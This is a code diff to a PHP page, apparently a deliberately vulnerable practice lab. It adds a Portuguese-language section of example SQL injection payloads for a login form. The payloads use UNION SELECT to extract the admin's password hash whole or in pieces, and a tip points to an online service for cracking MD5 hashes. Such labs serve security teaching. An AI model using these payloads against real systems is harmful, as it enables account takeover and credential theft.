@@ -98,6 +98,31 @@ include("db.php");
                     </div>
                 </div>
             </div>
+
+            <div class="accordion-item">
+                <h2 class="accordion-header" id="headingPassword">
+                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapsePassword">
+                        Extração de Senhas
+                    </button>
+                </h2>
+                <div id="collapsePassword" class="accordion-collapse collapse" data-bs-parent="#postExamples">
+                    <div class="accordion-body">
+                        <strong>Primeiros 4 caracteres da senha do admin:</strong><br>
+                        Username: <code>admin' UNION SELECT 1,username,SUBSTR(password,1,4),email FROM user WHERE username='admin' # </code><br>
+                        Password: <code>qualquer</code><br><br>
+
+                        <strong>Senha completa do admin (hash MD5):</strong><br>
+                        Username: <code>admin' UNION SELECT 1,username,password,email FROM user WHERE username='admin' # </code><br>
+                        Password: <code>qualquer</code><br><br>
+
+                        <strong>Extrair partes específicas da senha:</strong><br>
+                        Username: <code>admin' UNION SELECT 1,CONCAT('Pos 1-4: ',SUBSTR(password,1,4)),CONCAT('Pos 5-8: ',SUBSTR(password,5,4)),CONCAT('Total: ',LENGTH(password)) FROM user WHERE username='admin' # </code><br>
+                        Password: <code>qualquer</code><br><br>
+
+                        <small class="text-muted">💡 <strong>Dica:</strong> As senhas estão em hash MD5. Use sites como md5decrypt.net para decodificar.</small>
+                    </div>
+                </div>
+            </div>
         </div>
     </div>
 
